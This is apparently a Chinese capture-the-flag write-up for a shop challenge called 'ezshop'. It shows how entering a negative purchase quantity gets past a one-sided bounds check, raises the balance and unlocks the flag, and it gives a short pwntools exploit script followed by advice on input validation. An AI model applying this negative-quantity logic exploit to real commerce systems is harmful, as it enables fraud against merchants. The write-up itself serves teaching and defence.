# ezshop

## 题目简述

商店只拒绝 `cnt > 10`，没有限制购买数量必须为正数。购买时余额按 `money -= price * cnt` 计算，但购物车无论 `cnt` 是多少都执行一次 `++shopping_cart[ch-1]`。选择 flag 并购买 `-1` 个，会增加余额且把 flag 商品标记为已购买。

## 解题过程

关键判断为：

```c
if (cnt > 10) return;
if (money - price_arr[ch-1] * cnt < 0) return;
money -= price_arr[ch-1] * cnt;
++shopping_cart[ch-1];
```

当 `ch=3`、`cnt=-1` 时，余额检查变为 `1000 - 10000000 * (-1)`，显然非负；随后 `shopping_cart[2]` 从 0 增加到 1。选择“看好康的”后，`haokangde()` 检测该元素非零并调用 `orw()` 读取 `/flag`。

```python
from pwn import *

io = process("../dist/pwn")
io.sendlineafter(b">> ", b"1")
io.sendlineafter("想买点啥？\n".encode(), b"3")
io.sendlineafter("要几个？\n".encode(), b"-1")
io.sendlineafter(b">> ", b"2")
io.interactive()
```

## 方法总结

业务逻辑校验应覆盖完整输入域：数量必须同时有下界和上界，余额计算还应防止整数溢出。库存或购物车更新也必须使用实际购买数量，而不是无条件递增；只检查“是否非零”会让负数和异常状态同样通过。
